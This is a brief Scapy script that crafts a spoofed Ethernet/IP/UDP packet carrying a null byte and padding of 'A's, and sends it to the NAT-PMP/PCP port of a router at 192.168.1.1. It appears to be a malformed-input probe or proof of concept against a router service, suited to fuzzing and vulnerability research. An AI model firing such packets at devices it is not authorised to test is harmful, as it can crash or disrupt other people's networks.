from scapy.all import *

pkt = Ether(src='A4:42:3B:70:FE:59', dst='FC:34:97:5C:0C:F0')/IP(src='192.168.1.250', dst="192.168.1.1")/UDP(sport=13338, dport=5351)/"\x00AAAAAAAAAAAAAAAAAAAA"

while(True):
    sendp(pkt)
    time.sleep(0.5)
    break
